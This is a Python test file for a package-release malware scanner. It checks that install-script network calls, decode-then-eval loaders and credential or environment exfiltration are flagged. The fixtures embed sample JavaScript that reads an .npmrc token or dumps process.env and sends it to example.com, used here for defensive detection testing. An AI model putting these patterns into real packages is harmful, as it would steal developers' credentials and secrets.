"""Tests for full-scan mode and dependency resolution in release analysis."""

import json
from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import MagicMock, patch

from release_sentinel.differ import analyze_release
from release_sentinel.engine import decide
from release_sentinel.extractor import ReleaseContents
from release_sentinel.models import Decision, Severity


def _make_release(
    name: str = "test-pkg",
    version: str = "1.0.0",
    pkg_json: dict | None = None,
    files: dict[str, str] | None = None,
) -> ReleaseContents:
    """Helper to create an in-memory ReleaseContents for tests."""
    pkg = pkg_json or {"name": name, "version": version}
    file_bytes: dict[str, bytes] = {
        "package.json": json.dumps(pkg).encode("utf-8"),
    }
    if files:
        for fpath, content in files.items():
            file_bytes[fpath] = content.encode("utf-8")
    total = sum(len(b) for b in file_bytes.values())
    return ReleaseContents(files=file_bytes, total_size=total)


class TestFullScanMode:
    """Verify full-scan mode (analyze_release with baseline=None)."""

    def test_benign_package_allows(self):
        """A normal package with standard utilities allows without baseline."""
        release = _make_release(
            files={
                "index.js": "function add(a, b) { return a + b; }\nmodule.exports = { add };\n",
            }
        )
        evidence = analyze_release(release, baseline=None)
        decision, _ = decide(evidence, is_full_scan=True)
        assert decision == Decision.ALLOW
        assert len(evidence) == 0

    def test_install_script_network_blocks(self):
        """Install script fetching from a URL triggers install_script_network -> BLOCK."""
        release = _make_release(
            pkg_json={
                "name": "network-installer",
                "version": "1.0.0",
                "scripts": {"postinstall": "node install.js"},
            },
            files={
                "install.js": (
                    "const https = require('https');\n"
                    "https.get('https://example.com/asset.tgz', (res) => {});\n"
                ),
            },
        )
        evidence = analyze_release(release, baseline=None)
        decision, _ = decide(evidence, is_full_scan=True)
        assert decision == Decision.BLOCK
        ev_ids = [e.id for e in evidence]
        assert "install_script_network" in ev_ids

    def test_decode_and_execute_alone_warns_in_full_scan(self):
        """Decode-then-execute alone triggers decode_and_execute -> WARN (tightened in v1.4)."""
        release = _make_release(
            files={
                "index.js": (
                    "const payload = 'ZXhhbXBsZQ==';\n"
                    "const code = Buffer.from(payload, 'base64').toString('utf8');\n"
                    "eval(code);\n"
                ),
            }
        )
        evidence = analyze_release(release, baseline=None)
        decision, _ = decide(evidence, is_full_scan=True)
        assert decision == Decision.WARN
        ev_ids = [e.id for e in evidence]
        assert "decode_and_execute" in ev_ids

    def test_regex_exec_near_decode_uri_component_not_matched(self):
        """RegExp.exec near decodeURIComponent (query-string style)
        must not trigger decode_and_execute.
        """
        release = _make_release(
            files={
                "index.js": (
                    "function parse(qs) {\n"
                    "    const decoded = decodeURIComponent(qs);\n"
                    "    const match = /foo=([^&]+)/.exec(decoded);\n"
                    "    return match ? match[1] : null;\n"
                    "}\n"
                ),
            }
        )
        evidence = analyze_release(release, baseline=None)
        ev_ids = [e.id for e in evidence]
        assert "decode_and_execute" not in ev_ids

    def test_buffer_from_base64_near_exec_not_matched(self):
        """Buffer.from(x, 'base64') near bare exec( (bundler style)
        must not trigger decode_and_execute.
        """
        release = _make_release(
            files={
                "index.js": (
                    "const buf = Buffer.from('hello', 'base64');\n"
                    "function run(cmd) {\n"
                    "    exec(cmd);\n"
                    "}\n"
                ),
            }
        )
        evidence = analyze_release(release, baseline=None)
        ev_ids = [e.id for e in evidence]
        assert "decode_and_execute" not in ev_ids

    def test_eval_atob_matched(self):
        """eval(atob(...)) must trigger decode_and_execute."""
        release = _make_release(
            files={
                "index.js": "eval(atob(payload));\n",
            }
        )
        evidence = analyze_release(release, baseline=None)
        ev_ids = [e.id for e in evidence]
        assert "decode_and_execute" in ev_ids

    def test_new_function_buffer_from_matched(self):
        """new Function(Buffer.from(x, 'base64').toString()) must trigger decode_and_execute."""
        release = _make_release(
            files={
                "index.js": "new Function(Buffer.from(x, 'base64').toString())();\n",
            }
        )
        evidence = analyze_release(release, baseline=None)
        ev_ids = [e.id for e in evidence]
        assert "decode_and_execute" in ev_ids

    def test_credential_leak_blocks(self):
        """Credential file read plus network in same file triggers credential_leak -> BLOCK."""
        release = _make_release(
            files={
                "agent.js": (
                    "const fs = require('fs');\n"
                    "const https = require('https');\n"
                    "const token = fs.readFileSync('/home/user/.npmrc', 'utf8');\n"
                    "https.get('https://example.com/?t=' + token);\n"
                ),
            }
        )
        evidence = analyze_release(release, baseline=None)
        decision, _ = decide(evidence, is_full_scan=True)
        assert decision == Decision.BLOCK
        ev_ids = [e.id for e in evidence]
        assert "credential_leak" in ev_ids

    def test_env_harvesting_warns(self):
        """Bulk env enumeration plus network in same file triggers env_harvesting -> WARN."""
        release = _make_release(
            files={
                "telemetry.js": (
                    "const https = require('https');\n"
                    "const dump = JSON.stringify(process.env);\n"
                    "https.get('https://example.com/?env=' + dump);\n"
                ),
            }
        )
        evidence = analyze_release(release, baseline=None)
        decision, _ = decide(evidence, is_full_scan=True)
        assert decision == Decision.WARN
        ev_ids = [e.id for e in evidence]
        assert "env_harvesting" in ev_ids


class TestDependencyAwareUpdates:
    """Verify added runtime dependency scanning during release diffs."""

    @patch("release_sentinel.dependency_resolver.extract_release_in_memory")
    def test_added_benign_dependency_allows(self, mock_extract):
        """An update adding a benign dependency remains ALLOW."""
        old_rel = _make_release(
            version="1.0.0",
            pkg_json={"name": "pkg-a", "version": "1.0.0", "dependencies": {}},
        )
        new_rel = _make_release(
            version="1.1.0",
            pkg_json={
                "name": "pkg-a",
                "version": "1.1.0",
                "dependencies": {"dep-x": "^1.0.0"},
            },
        )
        now = datetime.now(UTC)
        mock_client = MagicMock()
        mock_client.get_metadata.return_value = {
            "versions": {
                "1.0.0": {
                    "version": "1.0.0",
                    "dist": {"tarball": "http://example.com/tarball.tgz"},
                }
            },
            "time": {"1.0.0": "2026-01-01T00:00:00.000Z"},
        }
        mock_client.download_tarball.return_value = Path("dummy.tgz")
        clean_dep = _make_release(
            name="dep-x",
            version="1.0.0",
            files={"index.js": "module.exports = 42;\n"},
        )
        mock_extract.return_value = clean_dep

        evidence = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=now,
            registry_client=mock_client,
        )
        decision, _ = decide(evidence, is_full_scan=False)
        assert decision == Decision.ALLOW

    @patch("release_sentinel.dependency_resolver.extract_release_in_memory")
    def test_added_malicious_dependency_blocks(self, mock_extract):
        """An update adding a dependency that runs install scripts blocks with [dep: ...] prefix."""
        old_rel = _make_release(
            version="1.0.0",
            pkg_json={"name": "pkg-a", "version": "1.0.0", "dependencies": {}},
        )
        new_rel = _make_release(
            version="1.1.0",
            pkg_json={
                "name": "pkg-a",
                "version": "1.1.0",
                "dependencies": {"mal-dep": "^1.0.0"},
            },
        )
        now = datetime.now(UTC)
        mock_client = MagicMock()
        mock_client.get_metadata.return_value = {
            "versions": {
                "1.0.0": {
                    "version": "1.0.0",
                    "dist": {"tarball": "http://example.com/mal.tgz"},
                }
            },
            "time": {"1.0.0": "2026-01-01T00:00:00.000Z"},
        }
        mock_client.download_tarball.return_value = Path("dummy.tgz")
        mal_dep = _make_release(
            name="mal-dep",
            version="1.0.0",
            pkg_json={
                "name": "mal-dep",
                "version": "1.0.0",
                "scripts": {"postinstall": "node postinstall.js"},
            },
            files={
                "postinstall.js": "const http = require('http'); http.get('http://ex.com');\n",
            },
        )
        mock_extract.return_value = mal_dep

        evidence = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=now,
            registry_client=mock_client,
        )
        decision, _ = decide(evidence, is_full_scan=False)
        assert decision == Decision.BLOCK
        dep_evidence = [e for e in evidence if "[dep: mal-dep@1.0.0]" in e.explanation]
        assert len(dep_evidence) > 0
        assert any(e.id == "install_script_network" for e in dep_evidence)

    def test_unresolvable_dependency_adds_info_evidence(self):
        """An unresolvable dependency emits an unresolvable_dependency INFO evidence item."""
        old_rel = _make_release(
            version="1.0.0",
            pkg_json={"name": "pkg-a", "version": "1.0.0", "dependencies": {}},
        )
        new_rel = _make_release(
            version="1.1.0",
            pkg_json={
                "name": "pkg-a",
                "version": "1.1.0",
                "dependencies": {"nonexistent-dep": "^1.0.0"},
            },
        )
        now = datetime.now(UTC)
        mock_client = MagicMock()
        mock_client.get_metadata.side_effect = Exception("Not found")

        # Eval mode: INFO severity -> ALLOW
        evidence_eval = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=now,
            registry_client=mock_client,
            mode="eval",
        )
        decision, _ = decide(evidence_eval, is_full_scan=False)
        assert decision == Decision.ALLOW
        unres = [e for e in evidence_eval if e.id == "unresolvable_dependency"]
        assert len(unres) == 1
        assert unres[0].severity == Severity.INFO

        # Live mode (Part 4a): MEDIUM severity -> WARN
        evidence_live = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=now,
            registry_client=mock_client,
            mode="live",
        )
        decision_live, _ = decide(evidence_live, is_full_scan=False)
        assert decision_live == Decision.WARN
        unres_live = [e for e in evidence_live if e.id == "unresolvable_dependency"]
        assert len(unres_live) == 1
        assert unres_live[0].severity == Severity.MEDIUM
        assert "[Exception: Not found]" in unres_live[0].explanation
